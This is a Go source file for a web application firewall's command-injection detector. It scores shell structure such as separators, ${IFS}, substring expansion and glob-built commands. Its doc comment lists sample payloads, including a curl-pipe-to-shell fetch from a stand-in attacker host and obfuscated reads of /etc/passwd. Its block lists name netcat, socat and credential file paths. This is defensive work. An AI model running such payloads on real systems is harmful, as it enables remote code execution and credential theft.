// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

// Package shelli detects command injection by reading shell structure rather
// than by matching command names.
//
// # Why a list of command names loses
//
// The rule this replaces matched literal command names, and four payloads walked
// straight through it — each one a technique that has been in use for years:
//
//	/???/c?t /etc/p?sswd            glob obfuscation: no command name present
//	echo Y2F0…|base64 -d|sh         the command arrives encoded
//	curl http://evil.sh|sh          fetch and pipe into an interpreter
//	${PATH:0:1}etc${PATH:0:1}passwd substring expansion builds "/etc/passwd"
//
// No literal list can fix these, because none of them contains the literal. The
// shell will happily assemble a command from wildcards, from variable slices,
// from quoted fragments — "c'a't" and "c\at" both run cat — and from base64 that
// only becomes a command after another process decodes it. Enumerating payloads
// against a language with this much expansion machinery is not a race that can
// be won.
//
// # What is actually being read
//
// Position, as in detect/xss. A command name means nothing on its own: "id",
// "less", "who", "find", and "sort" are ordinary English words, and a value
// containing "cat" is usually about an animal. What matters is a name appearing
// in *command position* — immediately after a separator that starts a new
// command:
//
//	first; second; third        prose: "second" is not a command
//	1.1.1.1; cat /etc/passwd    injection: "cat" is, and it follows ';'
//
// Around that sit the obfuscation signals, each chosen because it has no
// benign reading in user input: ${IFS}, ${VAR:0:1} substring expansion, $'\x63'
// ANSI-C quoting, brace expansion of a command, and a path built mostly from
// wildcards. Command-position tokens are unquoted before matching, so "c'a't"
// and "c\at" are read as what the shell will run.
//
// # A whole value that is a command line is not an injected one
//
// Injection means a *separator* introduced a command into a field that already
// held something else: a hostname, an ID, a filename. The value starts as data
// and turns into a command partway through.
//
// A field whose value is a command line from its first byte is a different
// thing. A CI pipeline API receives "cat VERSION | tr -d" in a run field
// because running it is the product; an automation platform stores
// "base64 -d < k.b64 && chmod 600 k" the same way. Calibration measured the
// cost of ignoring the distinction at one benign request in a hundred and
// forty.
//
// So when the first token is itself a command — or an interpreter path — the
// value is read as a stored command line and its internal separators stop
// being evidence. Nothing is lost: an injected payload virtually never begins
// with a bare command name, because the field held legitimate data first. A
// value that *is* only "cat /etc/passwd" still reports, because the sensitive
// path corroborates on its own.
//
// # A limit worth stating
//
// Backtick substitution around a single bare word is not reported. "`id`" is
// command substitution, and it is also how everyone writes inline code in
// Markdown — "use the `id` field to reference it" is a sentence, and blocking it
// makes the firewall an obstacle to the people documenting the system. Backticks
// count once the substitution contains an actual invocation: a second token, a
// path, or a separator. "$(id)" has no such benign reading and is reported.
package shelli

import (
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/types"
)

// Signal is one piece of structural evidence.
type Signal uint16

// Signals.
const (
	// SignalCommandPosition is a known command name immediately after a
	// separator that starts a new command. This is the core signal, and the
	// position is what makes it usable: the same names appear constantly as
	// ordinary words when nothing precedes them.
	SignalCommandPosition Signal = 1 << iota

	// SignalInterpreterPath is an absolute path to a shell or interpreter —
	// /bin/sh, /usr/bin/python. A value naming one is not describing a file.
	SignalInterpreterPath

	// SignalIFSSeparator is $IFS or ${IFS}, used to write a command without
	// typing a space. It has no meaning outside a shell and no benign reading
	// in user input at all.
	SignalIFSSeparator

	// SignalSubstringExpansion is ${VAR:0:1}, which slices a variable to build
	// a string a character at a time — the way "/etc/passwd" is spelled without
	// a slash. Distinct from ${VAR:-default}, which is ordinary documentation.
	SignalSubstringExpansion

	// SignalANSIQuoting is $'\x63\x61\x74', which spells a command in hex.
	SignalANSIQuoting

	// SignalGlobCommand is a path token built mostly from ? and * wildcards, as
	// in /???/c?t. A human writing a glob uses one wildcard and a real name.
	SignalGlobCommand

	// SignalVariableCommand is a bare variable expansion in command position,
	// as in the "$a$b" of "a=c;b=at;$a$b". Weak: the shape also appears in
	// ordinary shell documentation.
	SignalVariableCommand

	// SignalSensitivePath is a path that is only ever interesting to an
	// attacker — /etc/passwd, /etc/shadow, /proc/self/environ. Weak, because
	// prose and configuration discuss these files legitimately.
	SignalSensitivePath
)

// String implements fmt.Stringer so a decision can say what it saw.
func (s Signal) String() string {
	var out []byte
	add := func(n string) {
		if len(out) > 0 {
			out = append(out, '+')
		}
		out = append(out, n...)
	}
	if s&SignalCommandPosition != 0 {
		add("command_position")
	}
	if s&SignalInterpreterPath != 0 {
		add("interpreter_path")
	}
	if s&SignalIFSSeparator != 0 {
		add("ifs_separator")
	}
	if s&SignalSubstringExpansion != 0 {
		add("substring_expansion")
	}
	if s&SignalANSIQuoting != 0 {
		add("ansi_quoting")
	}
	if s&SignalGlobCommand != 0 {
		add("glob_command")
	}
	if s&SignalVariableCommand != 0 {
		add("variable_command")
	}
	if s&SignalSensitivePath != 0 {
		add("sensitive_path")
	}
	if len(out) == 0 {
		return "none"
	}
	return string(out)
}

// Threshold is the score at or above which a value is reported.
const Threshold = 5

// weightOf prices each signal by what it means alone.
//
// The strong signals reach the threshold by themselves because none has a
// benign reading in user input: nobody types ${IFS} or /???/c?t by accident.
// The two weak ones exist to corroborate — a bare variable in command position
// and a mention of /etc/passwd are each ordinary on their own, and together
// they are "a=c;b=at;$a$b /etc/passwd".
func weightOf(s Signal) int {
	switch s {
	case SignalCommandPosition, SignalInterpreterPath, SignalIFSSeparator,
		SignalSubstringExpansion, SignalANSIQuoting, SignalGlobCommand:
		return 5
	case SignalVariableCommand, SignalSensitivePath:
		return 3
	default:
		return 0
	}
}

// commands are names that mean something in command position.
//
// Many are ordinary English words — id, less, who, find, sort, head, at, env.
// That is precisely why the list is only consulted in command position; used
// anywhere else it would block half of all prose.
var commands = map[string]bool{
	// Shells and interpreters. Piping into one of these is the payload.
	"sh": true, "bash": true, "zsh": true, "ksh": true, "csh": true,
	"tcsh": true, "dash": true, "ash": true, "busybox": true,
	"python": true, "python2": true, "python3": true, "perl": true,
	"ruby": true, "php": true, "node": true, "lua": true, "tclsh": true,
	"powershell": true, "pwsh": true, "cmd": true, "wscript": true,

	// Fetchers: the second stage of nearly every real compromise.
	"curl": true, "wget": true, "nc": true, "ncat": true, "netcat": true,
	"socat": true, "ftp": true, "tftp": true, "scp": true, "ssh": true,
	"rsync": true, "telnet": true,

	// Readers and decoders.
	"cat": true, "tac": true, "head": true, "tail": true, "less": true,
	"more": true, "strings": true, "od": true, "xxd": true, "base64": true,
	"base32": true, "uudecode": true, "nl": true, "rev": true,

	// Reconnaissance.
	"id": true, "whoami": true, "uname": true, "hostname": true,
	"ps": true, "netstat": true, "ifconfig": true, "env": true,
	"printenv": true, "who": true, "w": true, "last": true, "lsof": true,
	"ss": true, "arp": true, "route": true,

	// Filesystem and execution.
	"ls": true, "dir": true, "find": true, "rm": true, "mv": true,
	"cp": true, "chmod": true, "chown": true, "kill": true, "killall": true,
	"eval": true, "exec": true, "sudo": true, "su": true, "nohup": true,
	"mkfifo": true, "mknod": true, "touch": true, "ln": true,

	// Text tools used to exfiltrate or assemble.
	"grep": true, "egrep": true, "awk": true, "sed": true, "sort": true,
	"uniq": true, "cut": true, "tr": true, "xargs": true, "tee": true,

	// Timing, resolution, and scheduling.
	"echo": true, "printf": true, "sleep": true, "ping": true, "dig": true,
	"nslookup": true, "host": true, "crontab": true, "at": true,
}

// interpreters are the basenames that make an absolute path dangerous.
var interpreters = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "ksh": true, "csh": true,
	"dash": true, "ash": true, "busybox": true, "python": true,
	"python2": true, "python3": true, "perl": true, "ruby": true,
	"php": true, "node": true, "nc": true, "ncat": true, "netcat": true,
}

// sensitivePaths are only ever interesting to an attacker.
var sensitivePaths = []string{
	"/etc/passwd", "/etc/shadow", "/etc/sudoers", "/proc/self/environ",
	"/proc/self/cmdline", "/root/.ssh", "/.aws/credentials",
	"/.ssh/id_rsa", "/etc/hosts", "/var/log/auth.log",
}

// Verdict is the result of analysing one value.
type Verdict struct {
	Signals Signal
	Score   int
	Span    types.Span
}

// Detected reports whether the evidence reached the threshold.
func (v Verdict) Detected() bool { return v.Score >= Threshold }

// Detector analyses values for command injection.
//
// A Detector is immutable and safe for concurrent use.
type Detector struct{}

// New returns a Detector.
func New() *Detector { return &Detector{} }

// Name implements the operator contract.
func (*Detector) Name() string { return "detect_shelli" }

// maxScan bounds how much of a value is analysed. Every signal is local to one
// command, so a payload needing more than this does not exist.
const maxScan = 64 << 10

// maxTokenLen bounds an unquoted command-position token. A command name is
// never this long, so a longer run cannot be one.
const maxTokenLen = 32

// Analyze scores value and returns the verdict.
func (d *Detector) Analyze(value []byte) Verdict {
	if len(value) == 0 {
		return Verdict{}
	}
	src := value
	if len(src) > maxScan {
		src = src[:maxScan]
	}

	var sigs Signal
	var span types.Span
	found := false

	mark := func(s Signal, off, n int) {
		sigs |= s
		if !found && weightOf(s) > 0 {
			span = types.SpanOf(off, n)
			found = true
		}
	}

	scanExpansions(src, mark)
	scanPaths(src, mark)

	// Separators inside a value that is already a command line are that
	// command's own syntax, not an injection point. Paths are still read above:
	// "/bin/sh -c id" arriving in a request value is the most conclusive RCE
	// shape there is, and an application that stores one on purpose needs a
	// scoped exception rather than a quieter detector.
	if !isStoredCommandLine(src) {
		scanCommandPositions(src, mark)
	}

	total := 0
	for bit := Signal(1); bit != 0; bit <<= 1 {
		if sigs&bit != 0 {
			total += weightOf(bit)
		}
	}
	return Verdict{Signals: sigs, Score: total, Span: span}
}

// scanExpansions looks for the shell expansions that have no benign reading.
func scanExpansions(src []byte, mark func(Signal, int, int)) {
	for i := 0; i < len(src); i++ {
		if src[i] != '$' {
			continue
		}
		rest := src[i+1:]

		switch {
		case hasPrefix(rest, "IFS"), hasPrefix(rest, "{IFS}"):
			mark(SignalIFSSeparator, i, 4)

		case len(rest) > 0 && rest[0] == '\'':
			// $'\x63' — ANSI-C quoting spells a command in escapes. Requiring
			// an escape keeps ordinary "$'text'" out.
			if j := indexByte(rest, '\''); j >= 0 && indexByte(rest[1:], '\\') >= 0 {
				mark(SignalANSIQuoting, i, 2)
			}

		case len(rest) > 0 && rest[0] == '{':
			// ${VAR:0:1} slices a variable to build a string a character at a
			// time. ${VAR:-default} and ${VAR:?msg} are documentation, so the
			// byte after the colon has to be a digit.
			if n, ok := substringExpansion(rest); ok {
				mark(SignalSubstringExpansion, i, n)
			}
		}
	}
}

// substringExpansion reports the length of a ${VAR:digit...} expansion at the
// start of rest, which must begin with '{'.
func substringExpansion(rest []byte) (int, bool) {
	j := 1
	for j < len(rest) && isWordByte(rest[j]) {
		j++
	}
	if j == 1 || j >= len(rest) || rest[j] != ':' {
		return 0, false
	}
	j++
	if j >= len(rest) || !isDigit(rest[j]) {
		return 0, false
	}
	return j + 1, true
}

// scanCommandPositions walks separators and reads the token that follows each.
func scanCommandPositions(src []byte, mark func(Signal, int, int)) {
	for i := 0; i < len(src); i++ {
		sepLen, backtick := separatorAt(src, i)
		if sepLen == 0 {
			continue
		}

		j := i + sepLen
		for j < len(src) && isSpace(src[j]) {
			j++
		}
		// Brace expansion opens a command position without a space:
		// ";{cat,/etc/passwd}" runs cat. Reading it here rather than as its own
		// signal is what lets "{" stay out of the literal set, and every JSON
		// body starts with "{".
		if j < len(src) && src[j] == '{' {
			j++
		}
		if j >= len(src) {
			return
		}

		// A path token built mostly of wildcards is a command whose name was
		// never typed: /???/c?t.
		if end, wilds := globToken(src, j); wilds >= 2 {
			mark(SignalGlobCommand, j, end-j)
			i = end - 1
			continue
		}

		end, word := commandWord(src, j)
		switch {
		case word == "" && j < len(src) && src[j] == '$':
			// A bare variable expansion standing where a command belongs.
			mark(SignalVariableCommand, j, 2)

		case commands[word]:
			// Backtick substitution around a single bare word is Markdown far
			// more often than it is an attack, so it needs a real invocation:
			// a second token, a path, or another separator.
			if backtick && !isInvocation(src, end) {
				continue
			}
			mark(SignalCommandPosition, j, end-j)
		}
		if end > j {
			i = end - 1
		}
	}
}

// separatorAt reports the length of a command separator at i, and whether it
// was a backtick — which is held to a higher bar by the caller.
func separatorAt(src []byte, i int) (n int, backtick bool) {
	switch src[i] {
	case ';', '\n', '|', '&':
		// "||" and "&&" are one separator, not two.
		if i+1 < len(src) && src[i+1] == src[i] {
			return 2, false
		}
		return 1, false
	case '`':
		return 1, true
	case '$':
		if i+1 < len(src) && src[i+1] == '(' {
			return 2, false
		}
	}
	return 0, false
}

// isInvocation reports whether what follows a command name looks like an actual
// invocation rather than a bare mention: an argument, a path, or a separator.
func isInvocation(src []byte, i int) bool {
	for ; i < len(src); i++ {
		switch {
		case src[i] == '`':
			// Closed with nothing in between but the name itself.
			return false
		case isSpace(src[i]):
			continue
		case src[i] == '/', src[i] == '-', src[i] == ';', src[i] == '|',
			src[i] == '&', src[i] == '$', isWordByte(src[i]):
			return true
		}
	}
	return false
}

// commandWord reads the token at i and returns it with quoting removed.
//
// Unquoting is the point: the shell runs "c'a't" and "c\at" as cat, so a
// detector reading the bytes verbatim sees neither.
func commandWord(src []byte, i int) (end int, word string) {
	var buf [maxTokenLen]byte
	n := 0

	for ; i < len(src); i++ {
		c := src[i]
		switch {
		case c == '\'' || c == '"':
			continue
		case c == '\\':
			// A backslash quotes the next byte, which is how "c\at" runs cat.
			continue
		case isWordByte(c):
			if n < len(buf) {
				buf[n] = fold(c)
				n++
			}
		default:
			return i, string(buf[:n])
		}
	}
	return i, string(buf[:n])
}

// globToken reports the end of a path-like token at i and how many wildcard
// bytes it contains.
func globToken(src []byte, i int) (end int, wildcards int) {
	start := i
	letters := 0

	// One exit, so every result is validated. An earlier version returned
	// directly on hitting a separator, which skipped the checks below entirely:
	// an ordinary Accept header — "…;q=0.9,image/avif,*/*;q=0.8" — was read as
	// a token with two wildcards and reported, blocking every browser that
	// sends one.
scan:
	for i < len(src) && !isSpace(src[i]) {
		switch src[i] {
		case '?', '*':
			wildcards++
		case ';', '|', '&', '`':
			break scan
		default:
			if isWordByte(src[i]) {
				letters++
			}
		}
		i++
	}

	switch {
	case letters == 0:
		// Pure punctuation globs nothing. "*/*" is a media range, not a command
		// whose name was hidden.
		return i, 0
	case wildcards*4 < i-start:
		// A lone wildcard is a glob someone typed; a token that is mostly
		// wildcards is a command name that was deliberately not typed.
		return i, 0
	default:
		return i, wildcards
	}
}

// isStoredCommandLine reports whether the value is a command line from its
// first byte, rather than data that a separator turned into one.
//
// Only the first token is consulted. "cat VERSION | tr" is a pipeline someone
// saved; "1.1.1.1; cat /etc/passwd" is a hostname field with a command appended
// to it, and the difference is entirely in what comes first.
func isStoredCommandLine(src []byte) bool {
	i := 0
	for i < len(src) && isSpace(src[i]) {
		i++
	}
	if i >= len(src) {
		return false
	}

	// An absolute interpreter path: "/bin/sh -c ...", "/usr/bin/python x.py".
	if src[i] == '/' {
		j := i
		for j < len(src) && !isSpace(src[j]) {
			j++
		}
		seg := src[i:j]
		for k := len(seg) - 1; k >= 0; k-- {
			if seg[k] == '/' {
				return interpreters[plainWord(seg[k+1:])]
			}
		}
		return false
	}

	end, word := commandWord(src, i)
	if end == i || word == "" {
		return false
	}
	// It must be a bare invocation, not a value that happens to start with a
	// command name followed by punctuation: "cat," and "id=5" are not commands.
	if end < len(src) && !isSpace(src[end]) {
		return false
	}
	return commands[word]
}

// scanPaths looks for interpreter paths and sensitive files.
func scanPaths(src []byte, mark func(Signal, int, int)) {
	for i := 0; i < len(src); i++ {
		if src[i] != '/' {
			continue
		}
		j := i + 1
		for j < len(src) && isWordByte(src[j]) {
			j++
		}
		// Compared without folding case, and that is a correctness decision
		// rather than an optimisation. "/bin/SH" does not resolve on a
		// case-sensitive filesystem, so folding would add surface with no
		// corresponding attack — and it would break the prefilter, because the
		// declared literals are the lowercase paths. The fuzz harness found
		// exactly that: "0/nC" scored as an interpreter path while no literal
		// covered it, so the rule could never have fired on it in practice.
		if interpreters[plainWord(src[i+1:j])] && i > 0 && src[i-1] != ' ' {
			// Preceded by a path component, so this is /bin/sh rather than a
			// sentence that happens to contain "/sh".
			mark(SignalInterpreterPath, i, j-i)
		}
	}
	for _, p := range sensitivePaths {
		if j := indexFolded(src, p); j >= 0 {
			mark(SignalSensitivePath, j, len(p))
		}
	}
}

// ---- byte helpers -----------------------------------------------------------

func fold(c byte) byte {
	if c >= 'A' && c <= 'Z' {
		return c + ('a' - 'A')
	}
	return c
}

func isWordByte(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
		(c >= '0' && c <= '9') || c == '_'
}

func isDigit(c byte) bool { return c >= '0' && c <= '9' }

func isSpace(c byte) bool {
	switch c {
	case ' ', '\t', '\n', '\r', '\v', '\f':
		return true
	}
	return false
}

func indexByte(b []byte, c byte) int {
	for i := range b {
		if b[i] == c {
			return i
		}
	}
	return -1
}

func hasPrefix(b []byte, s string) bool {
	if len(b) < len(s) {
		return false
	}
	for i := range len(s) {
		if b[i] != s[i] {
			return false
		}
	}
	return true
}

func indexFolded(b []byte, s string) int {
	for i := 0; i+len(s) <= len(b); i++ {
		ok := true
		for k := range len(s) {
			if fold(b[i+k]) != s[k] {
				ok = false
				break
			}
		}
		if ok {
			return i
		}
	}
	return -1
}

// plainWord returns a short token verbatim, without folding case.
func plainWord(w []byte) string {
	if len(w) == 0 || len(w) > maxTokenLen {
		return ""
	}
	return string(w)
}

// ---- operator ---------------------------------------------------------------

// Operator adapts the detector to the rule engine, so it is prefiltered,
// metered, and reported like every other rule.
func Operator() rules.Operator { return &operator{d: New()} }

type operator struct{ d *Detector }

func (o *operator) Name() string { return "detect_shelli" }

func (o *operator) Eval(_ *rules.EvalContext, value []byte) (rules.Match, bool) {
	v := o.d.Analyze(value)
	if !v.Detected() {
		return rules.Match{}, false
	}
	return rules.Match{Span: v.Span}, true
}

// Literals are the byte sequences without which no scoring signal can fire.
//
// Selectivity is the whole difficulty here, because shell injection keys on
// punctuation that ordinary HTTP is full of. A first version declared "/" and
// "{" — which made every request path and every JSON body a candidate, and
// broke the SLO that benign traffic evaluates zero rules. Neither is needed:
//
//   - every command-position signal requires a separator, so the separators
//     cover them without "/";
//   - brace expansion is read as a command position, so "{" is unnecessary;
//   - the only signal that fires without a separator is an interpreter path,
//     so those are named specifically rather than by their leading slash.
//
// The weak signals never fire alone and always need a separator alongside, so
// they need no literals of their own. FuzzLiteralsAreExhaustive enforces all of
// this rather than trusting the reasoning.
func (o *operator) Literals() ([]string, bool) {
	return []string{
		";", "|", "&", "`", "\n",
		"${", "$'", "$(", "$IFS",
		"/sh", "/bash", "/zsh", "/ksh", "/csh", "/dash", "/ash",
		"/busybox", "/python", "/perl", "/ruby", "/php", "/node",
		"/nc", "/ncat", "/netcat",
	}, true
}

// Cost prices one analysis: three passes with local lookahead.
func (o *operator) Cost() types.Fuel { return types.CostLiteralMatch * 6 }
